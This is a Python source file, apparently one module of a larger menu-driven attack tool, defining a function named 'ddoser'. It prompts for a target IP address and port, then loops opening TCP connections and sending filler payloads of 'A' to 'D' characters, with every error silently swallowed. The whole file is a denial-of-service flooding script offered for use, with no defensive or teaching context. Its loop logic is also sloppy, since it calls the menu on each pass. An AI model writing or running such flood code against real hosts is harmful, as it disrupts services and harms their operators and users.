import socket
import random
def ddoser():
    from main import clear_console
    from main import main_menu
    print("Starting DDoSer...")
    target = input("Please enter the target IP address: ")
    port = input("Please enter the target port: ")

    # Generate random payloads
    payloads = ['A' * 1024, 'B' * 600, 'C' * 300, 'D' * 100]

    # Start sending the payloads in a loop
    while True:
        try:
            payload = random.choice(payloads)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, int(port)))
            sock.send(payload.encode())
            sock.close()
        except:
            pass
        clear_console()
        main_menu()